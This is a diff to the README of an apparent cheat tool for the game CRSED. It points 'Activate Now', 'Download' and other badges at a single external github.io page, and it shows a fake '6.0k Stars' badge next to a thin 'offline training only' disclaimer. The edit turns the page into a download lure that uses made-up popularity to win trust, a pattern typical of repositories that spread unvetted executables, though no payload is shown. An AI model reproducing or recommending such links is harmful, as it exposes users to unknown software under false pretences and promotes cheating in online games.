@@ -11,10 +11,10 @@ CRSED (Cuisine Royale: Second Edition) mixes fast-paced combat with survival mec
 \[!WARNING]
 Intended for **offline or private training only**. Do not use in competitive environments.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 6.0k Stars](https://img.shields.io/badge/⭐️%206.0k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://crsed-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://crsed-cheat.github.io/.github/)
+[![⭐️ 6.0k Stars](https://img.shields.io/badge/⭐️%206.0k-Stars-yellow?style=for-the-badge\&logo=github)](https://crsed-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://crsed-cheat.github.io/.github/)
 
 ---
 
